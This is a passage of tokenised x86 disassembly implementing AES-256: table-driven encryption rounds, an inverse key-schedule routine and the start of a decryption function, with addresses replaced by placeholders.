mov [ esp + 0x18 ] edx
movzx eax [ esp + 0xc ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x10 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x14 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x8 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x74 ]
mov [ esp + 0x1c ] edx
movzx eax [ esp + 0x10 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x14 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x8 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0xc ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x78 ]
mov [ esp + 0x20 ] edx
movzx eax [ esp + 0x14 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x8 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0xc ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x10 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x7c ]
mov [ esp + 0x24 ] edx
movzx eax [ esp + 0x18 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x1c ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x20 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x24 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x80 ]
mov [ esp + 0x8 ] edx
movzx eax [ esp + 0x1c ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x20 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x24 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x18 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x84 ]
mov [ esp + 0xc ] edx
movzx eax [ esp + 0x20 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x24 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x18 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x1c ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x88 ]
mov [ esp + 0x10 ] edx
movzx eax [ esp + 0x24 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x18 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x1c ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x20 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x8c ]
mov [ esp + 0x14 ] edx
movzx eax [ esp + 0x8 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0xc ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x10 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x14 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x90 ]
mov [ esp + 0x18 ] edx
movzx eax [ esp + 0xc ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x10 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x14 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x8 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x94 ]
mov [ esp + 0x1c ] edx
movzx eax [ esp + 0x10 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x14 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x8 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0xc ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x98 ]
mov [ esp + 0x20 ] edx
movzx eax [ esp + 0x14 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x8 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0xc ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x10 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x9c ]
mov [ esp + 0x24 ] edx
movzx eax [ esp + 0x18 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x1c ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x20 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x24 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0xa0 ]
mov [ esp + 0x8 ] edx
movzx eax [ esp + 0x1c ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x20 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x24 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x18 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0xa4 ]
mov [ esp + 0xc ] edx
movzx eax [ esp + 0x20 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x24 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x18 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x1c ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0xa8 ]
mov [ esp + 0x10 ] edx
movzx eax [ esp + 0x24 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x18 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x1c ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x20 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0xac ]
mov [ esp + 0x14 ] edx
movzx eax [ esp + 0x8 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0xc ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x10 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x14 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0xb0 ]
mov [ esp + 0x18 ] edx
movzx eax [ esp + 0xc ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x10 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x14 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x8 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0xb4 ]
mov [ esp + 0x1c ] edx
movzx eax [ esp + 0x10 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x14 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x8 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0xc ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0xb8 ]
mov [ esp + 0x20 ] edx
movzx eax [ esp + 0x14 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x8 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0xc ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x10 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0xbc ]
mov [ esp + 0x24 ] edx
movzx eax [ esp + 0x18 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x1c ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x20 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x24 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0xc0 ]
mov [ esp + 0x8 ] edx
movzx eax [ esp + 0x1c ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x20 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x24 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x18 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0xc4 ]
mov [ esp + 0xc ] edx
movzx eax [ esp + 0x20 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x24 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x18 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x1c ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0xc8 ]
mov [ esp + 0x10 ] edx
movzx eax [ esp + 0x24 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x18 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x1c ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x20 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0xcc ]
mov [ esp + 0x14 ] edx
movzx eax [ esp + 0x8 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0xc ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x10 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x14 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0xd0 ]
mov [ esp + 0x18 ] edx
movzx eax [ esp + 0xc ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x10 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x14 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x8 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0xd4 ]
mov [ esp + 0x1c ] edx
movzx eax [ esp + 0x10 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x14 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x8 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0xc ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0xd8 ]
mov [ esp + 0x20 ] edx
movzx eax [ esp + 0x14 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x8 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0xc ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x10 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0xdc ]
mov [ esp + 0x24 ] edx
movzx eax [ esp + 0x18 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x1c ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x20 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x24 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0xe0 ]
mov [ esp + 0x8 ] edx
movzx eax [ esp + 0x1c ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x20 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x24 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x18 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0xe4 ]
mov [ esp + 0xc ] edx
movzx eax [ esp + 0x20 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x24 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x18 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x1c ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0xe8 ]
mov [ esp + 0x10 ] edx
movzx eax [ esp + 0x24 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x18 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x1c ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x20 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0xec ]
mov [ esp + 0x14 ] edx
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov eax [ esp + 0x4 ]
add eax 0x4
mov edx [ esp + 0xc ]
mov [ eax ] edx
mov eax [ esp + 0x4 ]
add eax 0x8
mov edx [ esp + 0x10 ]
mov [ eax ] edx
mov eax [ esp + 0x4 ]
add eax 0xc
mov edx [ esp + 0x14 ]
mov [ eax ] edx
add esp 0x28
pop esi
pop ebx
retn
sub_45bbb4
push ebx
push esi
push edi
add esp 0xfffffff4
mov [ esp ] eax
mov [ esp + 0x4 ] 0xd
mov ebx [ esp ]
add ebx 0x10
mov edx [ ebx ]
mov ecx edx
and ecx 0x80808080
mov eax ecx
shr eax 0x7
push eax
mov eax ecx
pop ecx
sub eax ecx
and eax 0x1b1b1b1b
mov ecx edx
and ecx 0x7f7f7f7f
add ecx ecx
xor eax ecx
mov ecx eax
and ecx 0x80808080
mov esi ecx
shr esi 0x7
sub ecx esi
and ecx 0x1b1b1b1b
mov esi eax
and esi 0x7f7f7f7f
add esi esi
xor ecx esi
mov [ esp + 0x8 ] ecx
mov ecx [ esp + 0x8 ]
and ecx 0x80808080
mov esi ecx
shr esi 0x7
sub ecx esi
and ecx 0x1b1b1b1b
mov esi [ esp + 0x8 ]
and esi 0x7f7f7f7f
add esi esi
xor ecx esi
xor edx ecx
mov esi edx
xor esi eax
shl esi 0x18
mov edi edx
xor edi eax
shr edi 0x8
or esi edi
xor eax [ esp + 0x8 ]
xor ecx eax
xor esi ecx
mov eax [ esp + 0x8 ]
xor eax edx
shl eax 0x10
mov ecx [ esp + 0x8 ]
xor ecx edx
shr ecx 0x10
or eax ecx
xor esi eax
mov eax edx
shl eax 0x8
shr edx 0x18
or eax edx
xor esi eax
mov [ ebx ] esi
mov edx [ ebx + 0x4 ]
mov ecx edx
and ecx 0x80808080
mov eax ecx
shr eax 0x7
push eax
mov eax ecx
pop ecx
sub eax ecx
and eax 0x1b1b1b1b
mov ecx edx
and ecx 0x7f7f7f7f
add ecx ecx
xor eax ecx
mov ecx eax
and ecx 0x80808080
mov esi ecx
shr esi 0x7
sub ecx esi
and ecx 0x1b1b1b1b
mov esi eax
and esi 0x7f7f7f7f
add esi esi
xor ecx esi
mov [ esp + 0x8 ] ecx
mov ecx [ esp + 0x8 ]
and ecx 0x80808080
mov esi ecx
shr esi 0x7
sub ecx esi
and ecx 0x1b1b1b1b
mov esi [ esp + 0x8 ]
and esi 0x7f7f7f7f
add esi esi
xor ecx esi
xor edx ecx
mov esi edx
xor esi eax
shl esi 0x18
mov edi edx
xor edi eax
shr edi 0x8
or esi edi
xor eax [ esp + 0x8 ]
xor ecx eax
xor esi ecx
mov eax [ esp + 0x8 ]
xor eax edx
shl eax 0x10
mov ecx [ esp + 0x8 ]
xor ecx edx
shr ecx 0x10
or eax ecx
xor esi eax
mov eax edx
shl eax 0x8
shr edx 0x18
or eax edx
xor esi eax
mov [ ebx + 0x4 ] esi
mov edx [ ebx + 0x8 ]
mov ecx edx
and ecx 0x80808080
mov eax ecx
shr eax 0x7
push eax
mov eax ecx
pop ecx
sub eax ecx
and eax 0x1b1b1b1b
mov ecx edx
and ecx 0x7f7f7f7f
add ecx ecx
xor eax ecx
mov ecx eax
and ecx 0x80808080
mov esi ecx
shr esi 0x7
sub ecx esi
and ecx 0x1b1b1b1b
mov esi eax
and esi 0x7f7f7f7f
add esi esi
xor ecx esi
mov [ esp + 0x8 ] ecx
mov ecx [ esp + 0x8 ]
and ecx 0x80808080
mov esi ecx
shr esi 0x7
sub ecx esi
and ecx 0x1b1b1b1b
mov esi [ esp + 0x8 ]
and esi 0x7f7f7f7f
add esi esi
xor ecx esi
xor edx ecx
mov esi edx
xor esi eax
shl esi 0x18
mov edi edx
xor edi eax
shr edi 0x8
or esi edi
xor eax [ esp + 0x8 ]
xor ecx eax
xor esi ecx
mov eax [ esp + 0x8 ]
xor eax edx
shl eax 0x10
mov ecx [ esp + 0x8 ]
xor ecx edx
shr ecx 0x10
or eax ecx
xor esi eax
mov eax edx
shl eax 0x8
shr edx 0x18
or eax edx
xor esi eax
mov [ ebx + 0x8 ] esi
mov edx [ ebx + 0xc ]
mov ecx edx
and ecx 0x80808080
mov eax ecx
shr eax 0x7
push eax
mov eax ecx
pop ecx
sub eax ecx
and eax 0x1b1b1b1b
mov ecx edx
and ecx 0x7f7f7f7f
add ecx ecx
xor eax ecx
mov ecx eax
and ecx 0x80808080
mov esi ecx
shr esi 0x7
sub ecx esi
and ecx 0x1b1b1b1b
mov esi eax
and esi 0x7f7f7f7f
add esi esi
xor ecx esi
mov [ esp + 0x8 ] ecx
mov ecx [ esp + 0x8 ]
and ecx 0x80808080
mov esi ecx
shr esi 0x7
sub ecx esi
and ecx 0x1b1b1b1b
mov esi [ esp + 0x8 ]
and esi 0x7f7f7f7f
add esi esi
xor ecx esi
xor edx ecx
mov esi edx
xor esi eax
shl esi 0x18
mov edi edx
xor edi eax
shr edi 0x8
or esi edi
xor eax [ esp + 0x8 ]
xor ecx eax
xor esi ecx
mov eax [ esp + 0x8 ]
xor eax edx
shl eax 0x10
mov ecx [ esp + 0x8 ]
xor ecx edx
shr ecx 0x10
or eax ecx
xor esi eax
mov eax edx
shl eax 0x8
shr edx 0x18
or eax edx
xor esi eax
mov [ ebx + 0xc ] esi
add ebx 0x10
dec [ esp + 0x4 ]
jne r-xdata
add esp 0xc
pop edi
pop esi
pop ebx
retn
sub_45beb4
push ebx
push esi
add esp 0xffffffd8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edx [ eax ]
mov ecx [ esp ]
xor edx [ ecx + 0xe0 ]
mov [ esp + 0x8 ] edx
lea edx [ eax + 0x4 ]
mov edx [ edx ]
mov ecx [ esp ]
xor edx [ ecx + 0xe4 ]
mov [ esp + 0xc ] edx
lea edx [ eax + 0x8 ]
mov edx [ edx ]
mov ecx [ esp ]
xor edx [ ecx + 0xe8 ]
mov [ esp + 0x10 ] edx
add eax 0xc
mov eax [ eax ]
mov edx [ esp ]
xor eax [ edx + 0xec ]
mov [ esp + 0x14 ] eax
movzx eax [ esp + 0x8 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x14 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x10 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0xc ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
